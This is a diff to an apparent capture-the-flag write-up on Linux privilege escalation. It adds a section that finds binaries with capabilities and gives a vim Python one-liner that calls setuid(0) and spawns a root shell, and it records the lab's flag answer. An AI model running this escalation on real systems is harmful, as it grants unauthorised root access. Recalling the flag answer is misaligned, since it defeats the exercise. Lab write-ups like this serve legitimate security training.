@@ -253,8 +253,29 @@ base64 /home/ubuntu/flag3.txt | base64 --decode
 
 ## Privilege Escalation: Capabilities
 
+list enabled capabilities
 
+```
+getcap -r / 2>/dev/null
+```
 
+We can see 6 binaries and other binary is view can be used through its capabilities
+
+![image](https://user-images.githubusercontent.com/90561566/196361386-89227b71-c8d6-4a16-891a-5b797ff29d7b.png)
+
+and we can use vim by its capability
+
+```
+./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+```
+
+![image](https://user-images.githubusercontent.com/90561566/196364019-516fe900-bf8d-46ec-901c-198ff773ca30.png)
+
+| Flag | flag4.txt |
+| --- | --- |
+| Answer | THM-9349843 |
+
+## Privilege Escalation: Cron Jobs
 
 
 
